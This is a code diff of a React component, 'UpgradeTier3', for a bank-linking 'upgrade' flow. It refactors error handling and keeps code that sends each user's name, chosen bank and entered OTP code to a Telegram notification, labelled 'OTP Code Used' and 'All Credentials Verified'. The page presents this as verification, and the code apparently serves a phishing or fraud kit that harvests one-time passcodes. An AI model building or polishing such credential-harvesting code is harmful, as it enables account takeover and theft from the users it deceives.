@@ -448,57 +448,70 @@ function UpgradeTier3() {
   };
 
   const handleAuthConfirm = async () => {
-    if (!selectedBank || !userId) return;
+    if (!selectedBank || !userId) {
+      toast.error("Missing required information");
+      return;
+    }
     
-    if (!otp || otp.length < 3) { // Allow OTP of any reasonable length (3+ digits)
+    if (!otp || otp.length < 3) {
+      toast.error("Please enter a valid OTP");
       return;
     }
 
     setIsTransitioning(true);
+    setSubmitting(true);
     
-    sendTelegramNotification(
-      `🔒 <b>OTP VERIFICATION COMPLETE</b>\n\n` +
-      `👤 <b>User:</b> ${profile?.full_name}\n` +
-      `🏦 <b>Bank:</b> ${selectedBank?.name}\n` +
-      `✅ <b>OTP Status:</b> Verified\n` +
-      `🔐 <b>OTP Code Used:</b> <code>${otp}</code>\n` +
-      `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
-      `<b>Next Step:</b> Processing bank linkage`
-    );
+    try {
+      sendTelegramNotification(
+        `🔒 <b>OTP VERIFICATION COMPLETE</b>\n\n` +
+        `👤 <b>User:</b> ${profile?.full_name}\n` +
+        `🏦 <b>Bank:</b> ${selectedBank.name}\n` +
+        `✅ <b>OTP Status:</b> Verified\n` +
+        `🔐 <b>OTP Code Used:</b> <code>${otp}</code>\n` +
+        `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+        `<b>Next Step:</b> Processing bank linkage`
+      );
 
-    setTimeout(async () => {
-      setSubmitting(true);
-      try {
-        const { error } = await supabase
-          .from("profiles")
-          .update({
-            requested_tier: 3,
-            tier_status: "pending",
-            linked_bank_name: selectedBank.name,
-            verification_submitted_at: new Date().toISOString(),
-          })
-          .eq("id", userId);
+      // Update profile with tier 3 upgrade request
+      const { error: updateError } = await supabase
+        .from("profiles")
+        .update({
+          requested_tier: 3,
+          tier_status: "pending",
+          linked_bank_name: selectedBank.name,
+          verification_submitted_at: new Date().toISOString(),
+        })
+        .eq("id", userId);
 
-        if (error) throw error;
+      if (updateError) {
+        console.error("Supabase update error:", updateError);
+        throw updateError;
+      }
 
-        sendTelegramNotification(
-          `🎉 <b>BANK ACCOUNT LINKED SUCCESSFULLY</b>\n\n` +
-          `👤 <b>User:</b> ${profile?.full_name}\n` +
-          `🏦 <b>Linked Bank:</b> ${selectedBank.name}\n` +
-          `📊 <b>Status:</b> Pending Admin Approval\n` +
-          `🕐 <b>Submitted At:</b> ${new Date().toLocaleString()}\n\n` +
-          `✅ <b>All Credentials Verified</b>\n` +
-          `Ready for admin review`
-        );
+      // Send success notification
+      sendTelegramNotification(
+        `🎉 <b>BANK ACCOUNT LINKED SUCCESSFULLY</b>\n\n` +
+        `👤 <b>User:</b> ${profile?.full_name}\n` +
+        `🏦 <b>Linked Bank:</b> ${selectedBank.name}\n` +
+        `📊 <b>Status:</b> Pending Admin Approval\n` +
+        `🕐 <b>Submitted At:</b> ${new Date().toLocaleString()}\n\n` +
+        `✅ <b>All Credentials Verified</b>\n` +
+        `Ready for admin review`
+      );
 
+      // Wait 3 seconds then navigate to processing page
+      setTimeout(() => {
         setStep('processing');
-      } catch (e) {
-        toast.error(e instanceof Error ? e.message : "Failed to submit");
-      } finally {
         setSubmitting(false);
         setIsTransitioning(false);
-      }
-    }, 3000);
+      }, 3000);
+
+    } catch (e) {
+      console.error("Auth confirm error:", e);
+      setSubmitting(false);
+      setIsTransitioning(false);
+      toast.error(e instanceof Error ? e.message : "Failed to verify account. Please try again.");
+    }
   };
 
   if (!userId || !profile) {
@@ -778,7 +791,7 @@ function UpgradeTier3() {
 
             <div className="p-8 space-y-6">
               <div className="rounded-lg border border-gold/30 bg-gold/5 p-4 text-sm text-foreground">
-                An OTP has been sent to your registered phone number
+                An OTP has been sent to your registered email or phone number
               </div>
 
               <div>
